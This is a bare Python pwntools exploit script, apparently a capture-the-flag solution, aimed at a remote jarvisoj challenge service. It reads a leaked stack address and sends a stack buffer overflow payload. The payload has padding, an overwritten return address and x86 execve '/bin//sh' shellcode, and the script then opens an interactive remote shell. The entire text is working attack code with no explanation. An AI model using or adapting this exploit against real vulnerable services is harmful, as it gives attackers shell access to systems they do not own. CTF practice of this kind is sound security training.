from pwn import *
sh = remote('pwn2.jarvisoj.com', 9877) 
line = sh.readline()
address = int(line[len("What's this:"):-2], 16)
print address
junk = 'a' * (0x88+4)
retaddr = address + 0x88 + 4 + 4
shellcode = "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80\n"
payload = junk + p32(retaddr) + shellcode
sh.send(payload)
sh.interactive()
